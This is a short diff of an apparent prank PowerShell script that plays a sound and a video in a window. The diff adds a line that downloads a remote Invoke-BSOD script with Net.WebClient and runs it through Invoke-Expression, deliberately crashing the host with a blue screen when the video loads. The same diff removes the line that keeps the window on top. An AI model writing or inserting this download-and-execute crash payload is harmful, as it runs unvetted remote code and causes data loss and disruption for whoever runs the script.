@@ -7,7 +7,6 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YeetTheAnson/vineboom/
 
 (New-Object System.Media.SoundPlayer "BlueScreen.wav").Play()
 Start-Sleep -Seconds 3
-$Window.Topmost = $true
 
 
 # WPF Library for Playing Movie and some components
@@ -45,9 +44,10 @@ $Timer.Add_Tick({
     $Timer.Stop()
 })
 
-# Start the countdown timer after the video starts playing
+# Start the countdown timer after the video starts playing and execute bsod
 $VideoPlayer.Add_Loaded({
     $Timer.Start()
+    Invoke-Expression ((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD
 })
 
 # Show Up the Window 
